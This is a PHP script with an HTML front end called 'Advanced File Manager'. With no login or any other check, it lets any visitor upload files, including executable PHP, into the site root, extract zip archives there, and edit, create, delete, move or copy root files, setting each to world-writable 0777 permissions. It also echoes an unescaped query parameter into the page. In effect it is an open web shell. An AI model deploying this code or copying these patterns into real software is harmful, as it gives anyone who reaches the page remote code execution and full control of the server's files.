<?php
$uploadDir = __DIR__ . '/upload/';
$rootDir = __DIR__ . '/';

if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);

// === Handle Upload ===
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $fileName = basename($_FILES['upload_file']['name']);
    $targetLocation = $_POST['upload_to'] === 'root' ? $rootDir : $uploadDir;
    $target = $targetLocation . $fileName;

    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        chmod($target, 0777);
        if (pathinfo($fileName, PATHINFO_EXTENSION) === 'zip' && isset($_POST['unzip'])) {
            $zip = new ZipArchive;
            if ($zip->open($target) === TRUE) {
                $zip->extractTo($targetLocation);
                $zip->close();
                unlink($target);
            }
        }
    }
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Handle Delete ===
if (isset($_GET['delete'])) {
    $file = basename($_GET['delete']);
    $location = $_GET['scope'] === 'root' ? $rootDir : $uploadDir;
    $path = $location . $file;
    if (file_exists($path)) unlink($path);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Edit File ===
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $location = $_GET['scope'] === 'root' ? $rootDir : $uploadDir;
    $path = $location . $file;
    if (file_exists($path)) {
        $content = htmlspecialchars(file_get_contents($path));
        echo <<<HTML
        <h2>Editing: $file</h2>
        <form method="POST">
            <textarea name="content" rows="25" cols="100" style="font-family: monospace;">$content</textarea><br>
            <input type="hidden" name="file" value="$file">
            <input type="hidden" name="scope" value="{$_GET['scope']}">
            <button type="submit" name="save">💾 Save</button>
        </form>
        <p><a href="{$_SERVER['PHP_SELF']}">🔙 Back</a></p>
HTML;
        exit;
    }
}

// === Save File ===
if (isset($_POST['save'], $_POST['file'], $_POST['content'], $_POST['scope'])) {
    $location = $_POST['scope'] === 'root' ? $rootDir : $uploadDir;
    file_put_contents($location . basename($_POST['file']), $_POST['content']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Create New File
if (isset($_POST['create_file'], $_POST['file_name'], $_POST['file_scope'])) {
    $location = $_POST['file_scope'] === 'root' ? $rootDir : $uploadDir;
    $filePath = $location . basename($_POST['file_name']);
    file_put_contents($filePath, '');
    chmod($filePath, 0777);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Create New Folder
if (isset($_POST['create_folder'], $_POST['folder_name'], $_POST['folder_scope'])) {
    $location = $_POST['folder_scope'] === 'root' ? $rootDir : $uploadDir;
    $folderPath = $location . basename($_POST['folder_name']);
    mkdir($folderPath, 0777);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Move/Copy File
if (isset($_POST['move_copy'], $_POST['file_name'], $_POST['from_scope'], $_POST['to_scope'], $_POST['action'])) {
    $from = $_POST['from_scope'] === 'root' ? $rootDir : $uploadDir;
    $to = $_POST['to_scope'] === 'root' ? $rootDir : $uploadDir;
    $src = $from . basename($_POST['file_name']);
    $dest = $to . basename($_POST['file_name']);

    if ($_POST['action'] === 'copy') {
        copy($src, $dest);
    } else {
        rename($src, $dest);
    }
    chmod($dest, 0777);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === Get File Lists
$uploadFiles = array_diff(scandir($uploadDir), ['.', '..']);
$rootFiles = array_diff(scandir($rootDir), ['.', '..']);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Advanced File Manager</title>
</head>
<body>
    <h1>📤 Upload File</h1>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="upload_file" required />
        <label><input type="checkbox" name="unzip"> Unzip if .zip</label>
        <select name="upload_to">
            <option value="upload">Upload to /upload</option>
            <option value="root">Upload to ROOT</option>
        </select>
        <button type="submit">Upload</button>
    </form>

    <hr>
    <h2>📄 Create New File or 📁 Folder</h2>
    <form method="POST">
        <input type="text" name="file_name" placeholder="newfile.txt" required />
        <select name="file_scope">
            <option value="upload">In /upload</option>
            <option value="root">In ROOT</option>
        </select>
        <button type="submit" name="create_file">➕ Create File</button>
    </form>
    <form method="POST" style="margin-top: 10px;">
        <input type="text" name="folder_name" placeholder="newfolder" required />
        <select name="folder_scope">
            <option value="upload">In /upload</option>
            <option value="root">In ROOT</option>
        </select>
        <button type="submit" name="create_folder">📁 Create Folder</button>
    </form>

    <hr>
    <h2>🔁 Move/Copy Files</h2>
    <form method="POST">
        <input type="text" name="file_name" placeholder="filename.txt" required />
        <select name="from_scope">
            <option value="upload">From /upload</option>
            <option value="root">From ROOT</option>
        </select>
        <select name="to_scope">
            <option value="upload">To /upload</option>
            <option value="root">To ROOT</option>
        </select>
        <select name="action">
            <option value="copy">Copy</option>
            <option value="move">Move</option>
        </select>
        <button type="submit" name="move_copy">🚚 Execute</button>
    </form>

    <hr>
    <h2>📁 Files in /upload</h2>
    <ul>
        <?php foreach ($uploadFiles as $file): ?>
        <li>
            <a href="upload/<?= urlencode($file) ?>" target="_blank"><?= htmlspecialchars($file) ?></a>
            | <a href="?edit=<?= urlencode($file) ?>&scope=upload">✏️ Edit</a>
            | <a href="?delete=<?= urlencode($file) ?>&scope=upload" onclick="return confirm('Delete?')">🗑️ Delete</a>
        </li>
        <?php endforeach; ?>
    </ul>

    <hr>
    <h2>🛠️ Files in Root Directory</h2>
    <ul>
        <?php foreach ($rootFiles as $file): ?>
            <?php if (is_file($rootDir . $file)) : ?>
            <li>
                <a href="<?= htmlspecialchars($file) ?>" target="_blank"><?= htmlspecialchars($file) ?></a>
                | <a href="?edit=<?= urlencode($file) ?>&scope=root">✏️ Edit</a>
                | <a href="?delete=<?= urlencode($file) ?>&scope=root" onclick="return confirm('Delete ROOT file?')">🗑️ Delete</a>
            </li>
            <?php endif; ?>
        <?php endforeach; ?>
    </ul>
</body>
</html>
